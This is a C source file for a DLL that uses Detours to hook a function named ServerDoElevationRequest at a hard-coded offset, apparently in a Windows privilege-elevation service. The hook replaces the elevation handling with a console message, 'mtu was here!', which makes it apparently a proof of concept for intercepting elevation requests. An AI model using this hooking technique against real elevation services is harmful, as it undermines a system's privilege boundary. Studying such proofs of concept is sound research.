#include <windows.h>
#include <stdio.h>
#include <detours.h>
#include <psapi.h>
#include <Lmcons.h>

// Original version
// const uint64_t kServerDoElevationRequestOffset = 0x8e840;

// 09 JUNE VERSION
const uint64_t kServerDoElevationRequestOffset = 0x895c0;


struct rpc_internal_struct {
    unsigned int length;
    unsigned int reserved;
    BYTE* data;
};

typedef unsigned long long(__fastcall* fnServerDoElevationRequest_t)(RPC_BINDING_HANDLE, HANDLE, HANDLE,
    HANDLE, int, rpc_internal_struct, rpc_internal_struct, rpc_internal_struct,
    rpc_internal_struct, GUID*, HANDLE);

fnServerDoElevationRequest_t OriginalServerDoElevationRequest = NULL;

unsigned long long HookedServerDoElevationRequest(RPC_BINDING_HANDLE rpcHandle,
    HANDLE input_process_handle, HANDLE pipe_handle, HANDLE file_handle, int run_mode,
    rpc_internal_struct cmd, rpc_internal_struct param_7, rpc_internal_struct param_8,
    rpc_internal_struct param_9, GUID* input_guid, HANDLE output_process) {
    DWORD ppid = GetProcessId(input_process_handle);
    FreeConsole();
    AttachConsole(ppid);

    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwLen = 0;
    WriteConsoleA(hStdOut, "mtu was here!\n", 15, &dwLen, NULL);

    return RPC_S_OK;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    if (DetourIsHelperProcess()) {
        return TRUE;
    }
    HMODULE target_process_handle = GetModuleHandle(NULL);

    if (dwReason == DLL_PROCESS_ATTACH) {
        OriginalServerDoElevationRequest = (fnServerDoElevationRequest_t)((uint64_t)target_process_handle + kServerDoElevationRequestOffset);
        HMODULE target_process_handle = GetModuleHandle(NULL);
        char* debugOutput = (char*)malloc(256);
        snprintf(debugOutput, 256, "Got Module Handle %p\n", (void*)target_process_handle);
        OutputDebugStringA(debugOutput);
        snprintf(debugOutput, 256, "Attaching the hook to function at %p\n", (void*)OriginalServerDoElevationRequest);
        OutputDebugStringA(debugOutput);

        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalServerDoElevationRequest, HookedServerDoElevationRequest);
        DetourTransactionCommit();
        snprintf(debugOutput, 256, "Hooked function at %p\n", (void*)HookedServerDoElevationRequest);
        OutputDebugStringA(debugOutput);
        free(debugOutput);
    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        HMODULE target_process_handle = GetModuleHandle(NULL);
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalServerDoElevationRequest, HookedServerDoElevationRequest);
        DetourTransactionCommit();
    }
    return TRUE;
}
